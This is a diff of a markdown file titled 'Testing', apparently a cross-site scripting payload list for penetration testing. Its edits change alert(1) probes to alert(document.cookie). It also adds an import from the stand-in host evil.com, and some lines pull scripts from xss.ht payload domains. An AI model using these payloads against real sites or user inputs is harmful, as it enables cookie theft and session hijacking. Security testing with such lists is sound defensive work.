@@ -1,15 +1,15 @@
 # Testing
 
 <style>
-.test{
-   color:red;
+{
+   backgroundcolor:red;
 }
 
 "/>&lt;script>alert(document.cookie)&lt;/script>"/>
 
-{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\"'");}}}}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=document.cookie)')+eval(y)+\"'");}}}}
 
-<script>alert(1)%0d%0a-->%09</script
+<script>alert(document.cookie)%0d%0a-->%09</script
 
 ' accesskey=X onclick=alert(document.cookie) '
 
@@ -27,21 +27,21 @@
 '"; alert("XSS attack!"); //';
 
 <img src=x onerror=alert(document.cookie)>
-'-alert(document.cookie)-';"-alert(document.cookie)-"//"><svg/onload=alert(3)>
-<img src=totallyfake onerror=alert(1);//
-<img src=x onerror=import(‘//domain.com/‘);//
-'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
+'-alert(document.cookie)-';"-alert(document.cookie)-"//"><svg/onload=alert(document.cookie)>
+<img src=totallyfake onerror=alert(document.cookie);//
+<img src=x onerror=import(‘//evil.com/‘);//
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`document.cookie`>%22%3E%3CSvg/onload=confirm`document.cookie`//<Script/src=//ChiragXSS.xSs.ht></scripT>
 
 
 “><svg/onload=confirm(1)>”@gmail.com
-<svg onload=location='javascript:alert(1)'>
-"<script>alert(1)</script>"@gmail.com
+<svg onload=location='javascript:alert(document.cookie)'>
+"<script>alert(document.cookie)</script>"@gmail.com
 "><--<img+src= "><svg/onload+alert(document.domain)>> --!>
 '"></title></textarea></script></style></noscript><script src=abc.xss.ht></script>
 
-test+(<script>alert(1)</script>)@gmail.com
-"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
-"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+test+(<script>alert(document.cookie)</script>)@gmail.com
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(document.cookie)"\>
+"><svg+svg+svg\/\/On+OnLoAd=confirm(document.cookie)>
 
 
 
